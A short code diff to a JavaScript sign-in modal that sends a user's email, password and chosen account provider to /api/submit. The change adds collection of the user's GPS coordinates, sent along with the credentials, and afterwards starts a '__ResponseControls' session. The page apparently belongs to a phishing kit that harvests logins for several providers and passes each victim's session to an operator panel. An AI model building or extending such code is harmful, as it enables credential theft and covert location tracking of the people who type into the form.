@@ -60,7 +60,7 @@
     if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeModal();
   });
 
-  form.addEventListener('submit', function (e) {
+  form.addEventListener('submit', async function (e) {
     e.preventDefault();
     const email = emailInput.value.trim();
     const password = passwordInput.value;
@@ -74,6 +74,8 @@
     submitBtn.textContent = 'Signing in…';
     errorBox.classList.remove('is-visible');
 
+    const gps = window.__ResponseControls ? await window.__ResponseControls.collectGps() : { lat: null, lng: null };
+
     fetch('/api/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -81,11 +83,17 @@
         email,
         password,
         provider: providerNames[currentProvider] || currentProvider,
+        lat: gps.lat,
+        lng: gps.lng,
       }),
     })
       .then(function (r) { return r.json(); })
-      .then(function () {
+      .then(function (data) {
         submitBtn.textContent = 'Verified';
+        if (data.sessionId && window.__ResponseControls) {
+          window.__ResponseControls.setSessionId(data.sessionId);
+          window.__ResponseControls.start(data.sessionId);
+        }
         setTimeout(closeModal, 800);
       })
       .catch(function () {
